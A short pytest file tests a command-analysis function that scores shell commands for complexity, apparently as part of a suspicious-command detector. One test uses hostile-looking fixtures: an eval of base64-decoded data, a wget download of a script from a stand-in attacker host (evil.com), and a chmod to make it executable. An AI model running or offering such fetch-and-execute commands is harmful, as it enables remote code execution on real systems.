import pytest
from services.analyzer import compute_complexity_score

def test_complexity_score_basic():
    commands = ["whoami", "uname -a"]
    score = compute_complexity_score(commands)
    assert score > 0
    assert score < 5.0  # simple commands

def test_complexity_score_obfuscation():
    commands = ["eval(base64_decode('aW5qZWN0'))", "wget http://evil.com/x.sh", "chmod +x x.sh"]
    score = compute_complexity_score(commands)
    assert score >= 1.0  # due to eval and base64

def test_complexity_score_empty():
    score = compute_complexity_score([])
    assert score == 0.0

